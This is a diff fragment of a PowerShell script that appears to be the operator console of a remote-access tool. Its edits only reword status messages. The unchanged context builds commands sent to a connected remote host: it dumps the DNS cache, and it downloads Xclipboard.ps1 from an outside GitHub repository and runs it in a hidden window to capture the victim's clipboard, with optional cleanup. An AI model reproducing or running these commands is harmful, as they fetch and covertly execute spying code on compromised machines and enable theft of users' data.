@@ -1293,7 +1293,7 @@ While($Client.Connected)
       $choise = Read-Host;
       If($choise -ieq "ListDNS" -or $choise -ieq "dns")
       {
-        write-host " * List of Remote-Host DNS Entrys." -ForegroundColor Green;Start-Sleep -Seconds 1
+        write-host " * Remote host DNS entrys." -ForegroundColor Green;Start-Sleep -Seconds 1
         $Command = "Get-DnsClientCache|Select-Object Entry,Name,DataLength,Data|Format-Table -AutoSize > dns.txt;Get-Content dns.txt;remove-item dns.txt -Force";
       }
       If($choise -ieq "TCPinfo" -or $choise -ieq "TCP")
@@ -2165,16 +2165,16 @@ While($Client.Connected)
               write-host "`n`n   capture  : " -NoNewline
               write-host "$CaptureTime" -ForegroundColor Red -NoNewline
               write-host " (seconds)"
-              write-host "   logfile  : %TMP%\clipboard.log"
 
               If($Forensic -iMatch '^(y|yes)$')
               {
-                 write-host "   Forensic : %TMP%\Forensic\`n"
+                 write-host "   logfile  : %TMP%\Forensic\clipboard.log"
+                 write-host "   Storage  : %TMP%\Forensic\`n"
                  $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Xclipboard.ps1`" -OutFile `"`$Env:TMP\Xclipboard.ps1`"|Unblock-File;cd `$Env:TMP;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file Xclipboard.ps1 -action Capture -CaptureTime $CaptureTime -Forensic -CleanUp`""
               }
               Else
               {
-                 write-host ""
+                 write-host "   logfile  : %TMP%\clipboard.log`n"
                  $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Xclipboard.ps1`" -OutFile `"`$Env:TMP\Xclipboard.ps1`"|Unblock-File;cd `$Env:TMP;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file Xclipboard.ps1 -action Capture -CaptureTime $CaptureTime -CleanUp`""
               }
          }
